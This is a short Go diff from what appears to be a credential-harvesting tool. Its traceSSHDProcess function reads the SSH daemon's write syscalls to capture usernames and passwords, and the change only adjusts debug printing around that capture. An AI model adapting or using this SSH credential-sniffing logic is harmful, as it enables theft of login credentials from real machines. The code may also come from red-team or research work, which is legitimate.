@@ -75,7 +75,7 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 							continue
 						}
 						if debug.Debug {
-							fmt.Printf("[*] Captured write syscall to fd %v with buffer: %s\n", fd, string(buffer))
+							fmt.Printf("[*] Captured write syscall to fd %v with buffer:\n%s\n", fd, string(buffer))
 						}
 
 						var password string
@@ -91,13 +91,8 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 						} else {
 							password = string(buffer)
 						}
-						if debug.Debug {
-							fmt.Printf("[*] raw potential password from buffer:\n%v\n", password)
-						}
 						password = RemoveNonPrintableAscii(password)
-						if debug.Debug {
-							fmt.Printf("[*] cleaned potential password from buffer:\n%v\n", password)
-						}
+
 						if IsValidPassword(password) {
 							if firstValidCapture == "" {
 								// First valid capture during SSH auth is the username,
